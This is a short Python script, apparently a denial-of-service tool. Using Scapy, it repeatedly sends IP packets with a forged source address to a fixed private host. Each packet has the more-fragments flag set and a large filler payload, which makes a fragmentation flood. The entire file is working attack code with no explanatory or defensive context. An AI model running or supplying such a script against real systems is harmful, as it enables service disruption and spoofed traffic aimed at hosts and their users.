from scapy.all import *

dst="10.240.136.51"
src="1.2.3.4"

for i in range(1, 2000):
    ip = IP(src=src, dst=dst, id=i, flags=1, frag=0)
    send(ip/b'A'*40000)
